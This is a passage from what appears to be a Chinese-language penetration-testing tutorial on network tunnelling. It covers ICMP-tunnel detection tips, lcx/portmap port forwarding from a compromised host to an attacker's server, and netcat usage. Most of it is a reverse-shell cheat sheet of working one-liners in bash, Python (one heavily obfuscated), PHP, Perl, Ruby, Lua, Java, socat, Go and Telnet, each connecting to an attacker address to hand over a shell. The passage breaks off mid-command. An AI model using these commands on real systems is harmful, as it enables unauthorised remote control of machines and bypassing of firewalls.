+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-x    <span class="c1"># 指定icmp隧道连接验证密码</span>
+</span></span><span class="line"><span class="cl">-p    <span class="c1"># 指定icmp隧道另一端机器(跳板)的ip地址</span>
+</span></span><span class="line"><span class="cl">-lp   <span class="c1"># 指定要监听的本地tcp端口</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-da   <span class="c1"># 指定要转发的机器的ip地址</span>
+</span></span><span class="line"><span class="cl">-dp   <span class="c1"># 指定要转发的机器的tcp端口</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>其他工具</strong></p>
+<h6 id="防御方法">防御方法</h6>
+<p>通过Wireshark进行ICMP数据包分析，如下：</p>
+<ul>
+<li>检查同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包</li>
+<li>注意那些Payload大于64bit的ICMP数据包</li>
+<li>寻找响应数据包的Payload与请求数据包中的Payload不一致的ICMP数据包</li>
+<li>检查ICMP数据包的协议标签。例如：icmptunnel会在所有的ICMP Payload前面添加&quot;TUNL&quot;标记来标识隧道 -&gt; 这就是特征</li>
+</ul>
+<h2 id="font-colorred-传输层隧道技术font"><font color=red> 传输层隧道技术</font></h2>
+<p>传输层技术包括：TCP隧道、UDP隧道、常规端口转发等</p>
+<p>若内网防火墙阻止了指定端口的访问，在获得目标主机权限后，可以使用iptables打开指定端口</p>
+<h4 id="1lcx端口转发">1.lcx端口转发</h4>
+<p>两个版本：</p>
+<ul>
+<li>Linux 版本：<code>portmap</code></li>
+<li>Widows版本：<code>lcx.exe</code></li>
+</ul>
+<p>一个客户端一个服务端</p>
+<p><strong>lcx内网端口转发</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">先传lcx到目标机器
+</span></span><span class="line"><span class="cl"><span class="c1">#在内网目标shell上: l</span>
+</span></span><span class="line"><span class="cl">cx -slave 公网ip <span class="m">4444</span> 127.0.0.1 <span class="m">3389</span>  <span class="c1"># 把目标机器的3389流量转发到指定服务器(vps)指定端口</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#vps服务器(我的)上执行：</span>
+</span></span><span class="line"><span class="cl">lcx -listen <span class="m">4444</span> <span class="m">33891</span>  <span class="c1"># 将本地4444端口上监听的所有数据转发到本机33891端口</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#然后远程桌面连接本地的33891端口即可</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>lcx本地端口映射</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 如果目标防火墙 限制了部分端口的数据(如3389)，可以进行端口转发：把3389端口的数据转发到防火墙允许的其他端口(如:53)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 在目标主机执行</span>
+</span></span><span class="line"><span class="cl">lcx -tran <span class="m">53</span> &lt;目标ip&gt;: <span class="m">3389</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>linux版的portmap</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 下载地址：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># vps</span>
+</span></span><span class="line"><span class="cl">./portmap -m <span class="m">2</span> -p1 <span class="m">6666</span> -h2 公网ip -p2 <span class="m">7777</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 目标内网机器</span>
+</span></span><span class="line"><span class="cl">./portmap -m <span class="m">3</span> -h1 127.0.0.1 -p1 <span class="m">22</span> -h2 公网ip -p2 <span class="m">6666</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2netcat">2.netcat</h4>
+<p>安装</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Linux</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#1. </span>
+</span></span><span class="line"><span class="cl">apt-get install netcat
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. </span>
+</span></span><span class="line"><span class="cl">wget ...
+</span></span><span class="line"><span class="cl">tar -zxvf ...
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ...
+</span></span><span class="line"><span class="cl">./configure
+</span></span><span class="line"><span class="cl">make
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Windows</span>
+</span></span><span class="line"><span class="cl">https://joncraton.org/files/nc111nt.zip
+</span></span><span class="line"><span class="cl">https://joncraton.org/files/nc111nt_safe.zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"></code></pre></td></tr></table>
+</div>
+</div><p><strong>使用</strong>
+Banner抓取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># banner可标识服务的版本等信息</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 题外话:追踪路由</span>
+</span></span><span class="line"><span class="cl">mtr 114.114.114.114 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## nc作为客户端：</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 参数 -v  显示详细信息 </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 参数  -n  如果是域名,不进行域名解析(建议直接跟ip地址)</span>
+</span></span><span class="line"><span class="cl">nc -nv 1.1.1.1 <span class="m">110</span>   <span class="c1"># 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令）</span>
+</span></span><span class="line"><span class="cl">nc -nv 1.1.1.1 <span class="m">25</span>    <span class="c1"># smtp服务器</span>
+</span></span><span class="line"><span class="cl">nc -nv 1.1.1.1 <span class="m">80</span>    <span class="c1"># 探测80端口(都可进行交互的命令)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>连接到远程主机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nvv 1.1.1.1 <span class="m">110</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>端口扫描</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#并非擅长端口扫描, 还慢</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#参数 -z 扫描参数，只判断是否开放（默认tcp）</span>
+</span></span><span class="line"><span class="cl">nc -nvz 1.1.1.1  20-8080
+</span></span><span class="line"><span class="cl"><span class="c1">#参数 -u  扫描udp服务的端口 （不太准确）</span>
+</span></span><span class="line"><span class="cl">nc -nvzu 1.1.1.1 1-1024
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>端口监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -l -p <span class="m">999</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 习惯</span>
+</span></span><span class="line"><span class="cl">nc -lvvp <span class="m">9999</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>文件传输</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 一旦连接建立，数据流就会传入，接收文件</span>
+</span></span><span class="line"><span class="cl">nc -lp <span class="m">333</span> &gt;1.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># 发送文件内容</span>
+</span></span><span class="line"><span class="cl">nc -nv 192.168.0.11 &lt; test.txt -q <span class="m">1</span>    <span class="c1">#参数 -q: 输出完成之后过1秒就断开</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>简易聊天</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -l -p <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -vn 192.168.0.11 <span class="m">8888</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 参考：https://www.uedbox.com/post/54632</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># https://www.secpulse.com/archives/76223.html</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##### nc正向shell（正向shell -&gt; 内网服务器之间）</span>
+</span></span><span class="line"><span class="cl">1.目标主机监听：
+</span></span><span class="line"><span class="cl">nc -lvvp <span class="m">4444</span> -e /bin/bash <span class="c1"># linux</span>
+</span></span><span class="line"><span class="cl">nc -lvvp <span class="m">4444</span> -e c:<span class="se">\\</span>WINDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe    <span class="c1"># win</span>
+</span></span><span class="line"><span class="cl">2.本机连接目标
+</span></span><span class="line"><span class="cl">nc 192.168.1.11 <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##### nc反向shell</span>
+</span></span><span class="line"><span class="cl">1.本机
+</span></span><span class="line"><span class="cl">nc -lvvp <span class="m">3333</span>       
+</span></span><span class="line"><span class="cl">2.目标机器执行
+</span></span><span class="line"><span class="cl">nc 192.168.0.111 <span class="m">3333</span> -c /bin/bash    <span class="c1"># Linux</span>
+</span></span><span class="line"><span class="cl">nc 192.168.0.111 -e c:<span class="se">\\</span>WINDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe    <span class="c1"># win</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">###### 如果目标主机没有nc，获取反向shell</span>
+</span></span><span class="line"><span class="cl"><span class="c1">###### 或者假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># bash反弹shell</span>
+</span></span><span class="line"><span class="cl">/bin/bash -c bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.41.13/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># bash反弹shell(TCP)</span>
+</span></span><span class="line"><span class="cl">目标机器： bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.41.133/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">攻击方： nc -lvvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># bash反弹shell(UDP)</span>
+</span></span><span class="line"><span class="cl">目标机器： bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.41.133/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">攻击方监听： nc -u -lvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># python反向shell</span>
+</span></span><span class="line"><span class="cl">// 方法一
+</span></span><span class="line"><span class="cl">$ python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">// 方法二
+</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">;</span><span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span>12345<span class="p">;</span>python -c <span class="s1">&#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># windows python反弹shell</span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>ython27<span class="se">\p</span>ython.exe -c <span class="s2">&#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.11.0.37&#39;, 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># php反向shell</span>
+</span></span><span class="line"><span class="cl">php -r <span class="s1">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Perl反向shell</span>
+</span></span><span class="line"><span class="cl">perl -e <span class="s1">&#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl">perl -MIO -e <span class="s1">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;[IPADDR]:[PORT]&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#NOTE: Windows only</span>
+</span></span><span class="line"><span class="cl">perl -MIO -e <span class="s1">&#39;$c=new IO::Socket::INET(PeerAddr,&#34;[IPADDR]:[PORT]&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Ruby反向shell</span>
+</span></span><span class="line"><span class="cl">ruby -rsocket -e<span class="s1">&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#不依赖于/bin/sh的反弹shell</span>
+</span></span><span class="line"><span class="cl">ruby -rsocket -e <span class="s1">&#39;exit if fork;c=TCPSocket.new(&#34;attackerip&#34;,&#34;4444&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#如果目标系统运行Windows反弹shell</span>
+</span></span><span class="line"><span class="cl">ruby -rsocket -e <span class="s1">&#39;c=TCPSocket.new(&#34;attackerip&#34;,&#34;4444&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Lua反向shell</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#Linux</span>
+</span></span><span class="line"><span class="cl">lua -e <span class="s2">&#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#Windows</span>
+</span></span><span class="line"><span class="cl">lua5.1 -e <span class="s1">&#39;local host, port = &#34;127.0.0.1&#34;, 4444 local socket = require(&#34;socket&#34;) local tcp = socket.tcp() local io = require(&#34;io&#34;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &#39;</span>r<span class="s1">&#39;) local s = f:read(&#34;*a&#34;) f:close() tcp:send(s) if status == &#34;closed&#34; then break end end tcp:close()&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Java反弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="nv">r</span> <span class="o">=</span> Runtime.getRuntime<span class="o">()</span> <span class="nv">p</span> <span class="o">=</span> r.exec<span class="o">([</span><span class="s2">&#34;/bin/bash&#34;</span>,<span class="s2">&#34;-c&#34;</span>,<span class="s2">&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span class="o">]</span> as String<span class="o">[])</span> p.waitFor<span class="o">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># socat反弹shell</span>
+</span></span><span class="line"><span class="cl">socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.79.137:5555
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Golang反弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;package main;import&#34;os/exec&#34;;import&#34;net&#34;;func main(){c,_:=net.Dial(&#34;tcp&#34;,&#34;192.168.0.134:8080&#34;);cmd:=exec.Command(&#34;/bin/sh&#34;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}&#39;</span> &gt; /tmp/t.go <span class="o">&amp;&amp;</span> go run /tmp/t.go <span class="o">&amp;&amp;</span> rm /tmp/t.go
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Telnet反弹shell</span>
+</span></span><span class="line"><span class="cl">rm -f /tmp/p<span class="p">;</span> mknod /tmp/p p <span class="o">&amp;&amp;</span> telnet ATTACKING-IP <span class="m">80</span> 0/tmp/p
